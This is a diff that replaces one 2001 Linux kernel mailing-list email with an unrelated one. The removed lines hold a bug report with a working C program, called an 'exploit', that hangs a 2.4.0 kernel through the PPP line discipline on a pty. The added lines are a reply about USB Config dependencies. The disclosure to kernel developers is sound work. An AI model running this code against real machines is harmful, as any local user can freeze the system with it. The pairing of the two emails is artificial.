@@ -1,104 +1,43 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id <S132887AbRAKQ6r>; Thu, 11 Jan 2001 11:58:47 -0500
+	id <S132958AbRAKRB5>; Thu, 11 Jan 2001 12:01:57 -0500
 Received: (majordomo@vger.kernel.org) by vger.kernel.org
-	id <S132930AbRAKQ6c>; Thu, 11 Jan 2001 11:58:32 -0500
-Received: from p020-53.netc.pt ([213.30.21.20]:22276 "EHLO thecrypt.utad.pt")
-	by vger.kernel.org with ESMTP id <S132887AbRAKQ6N>;
-	Thu, 11 Jan 2001 11:58:13 -0500
-Message-ID: <3A5BF929.20B77ED0@alvie.com>
-Date: Wed, 10 Jan 2001 05:54:49 +0000
-From: Alvaro Lopes <alvieboy@alvie.com>
-X-Mailer: Mozilla 4.75 [en] (X11; U; Linux 2.4.0 i686)
-X-Accept-Language: en
-MIME-Version: 1.0
-To: linux-kernel@vger.kernel.org
-CC: paulus@linuxcare.com
-Subject: Kernel (2.4.0) lock-up using ppp_async - SEVERE - EXPLOIT RUNS AS ANY 
- USER.
-Content-Type: text/plain; charset=iso-8859-1
-Content-Transfer-Encoding: 8bit
+	id <S132969AbRAKRBr>; Thu, 11 Jan 2001 12:01:47 -0500
+Received: from linuxpc1.lauterbach.com ([194.195.165.177]:14891 "HELO
+	linuxpc1.lauterbach.com") by vger.kernel.org with SMTP
+	id <S132958AbRAKRB3>; Thu, 11 Jan 2001 12:01:29 -0500
+Message-Id: <5.0.2.1.2.20010111175414.03377210@mail.lauterbach.com>
+X-Mailer: QUALCOMM Windows Eudora Version 5.0.2
+Date: Thu, 11 Jan 2001 18:01:19 +0100
+To: linux-usb-devel@lists.sourceforge.net
+From: Franz Sirl <Franz.Sirl-kernel@lauterbach.com>
+Subject: Re: [linux-usb-devel] [PATCH] USB Config fix for 2.2.19-pre7
+Cc: Alan Cox <alan@lxorguk.ukuu.org.uk>, f5ibh <f5ibh@db0bm.ampr.org>,
+        linux-kernel@vger.kernel.org, linux-usb-devel@lists.sourceforge.net
+In-Reply-To: <20010110164451.A16985@kroah.com>
+In-Reply-To: <20010110002639.B26680@wirex.com>
+Mime-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"; format=flowed
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Hi all, hi Paulus.
+At 01:44 2001-01-11, Greg KH wrote:
+>Hi,
+>
+>Here's a fix for the USB Config for 2.2.19-pre7.  I messed up and took
+>out the HID devices in the patch I sent you for 2.2.19-pre6.
 
+Why do the input handlers depend on CONFIG_USB_HID? On PPC we already have 
+trouble with them depending on CONFIG_USB, so everybody has to select 
+CONFIG_USB even if he just has ADB hardware.
 
-Is somewhat odd how I got it, but here it goes.
-I found a bug in 2.4.0 async PPP driver. I tested the same program in
-2.2.17 and it run perfectly (and without hanging).
+Alan, would you accept a patch putting 2 main_menu's for CONFIG_USB and 
+CONFIG_INPUT into usb/Config.in? This avoids the move of the input drivers 
+into drivers/input as in 2.4 (which you seemingly don't want in 2.2) and 
+only requires a minor adjustment in drivers/Makefile.
 
-So, here goes the description:
+Franz.
 
-2.4.0 Kernel hangs up when I do the following stuff:
-
-	* Create a new PTY using openpty();
-	* Fork using forkpty. Now, the child process does this:
-		- Set the fd 0 line discipline to PPP;
-		- tries infinitely to read the standard input.
-
-	The parent process sets the line discipline of the master PTY fd to PPP
-also, and then writes to it. As I was able to see (strace), the write
-function never returns.
-
-Hopefully SysRQ worked, and I was able to trace the bug to
-ppp_async_push. It seems the endless loop there is really endless.
-(sigh)
-
-Here's a copy of the "exploit".
-
--- cut here --
-
-/* Compile with -lutil */
-
-#include <pty.h>
-#include <termios.h>
-#include <sys/ioctl.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <sys/types.h>
-#include <linux/types.h>
-#include <asm/types.h>
-#include <net/if.h>
-#include <linux/ppp_defs.h>
-
-
-int main(int argc, char **argv) {
-    int fdmaster,fdslave;
-    struct termios t;
-    struct winsize w;
-    char name[80],fdn[8];
-    int pppdisc = N_PPP;
-    
-    tcgetattr(0, &t);
-    openpty(&fdmaster, &fdslave,name, &t, &w);
-    switch (forkpty(&fdmaster,name,&t,&w)) {
-    case 0:
-            ioctl(0, TIOCSETD, &pppdisc);
-        while (1==1) {
-            char buf[80];
-            read(0, buf, 80);
-        }
-    }
-
-    ioctl(fdmaster, TIOCSETD, &pppdisc);
-
-    while (1==1) {
-        write(fdmaster,"OK\n", 3);
-        sleep(1);
-    }
-}
-
-
-
--- cut here --
-
-
-Álvaro Lopes 
-Network Consulting
-<alvieboy@alvie.com>
-http://www.alvie.com/
 -
 To unsubscribe from this list: send the line "unsubscribe linux-kernel" in
 the body of a message to majordomo@vger.kernel.org
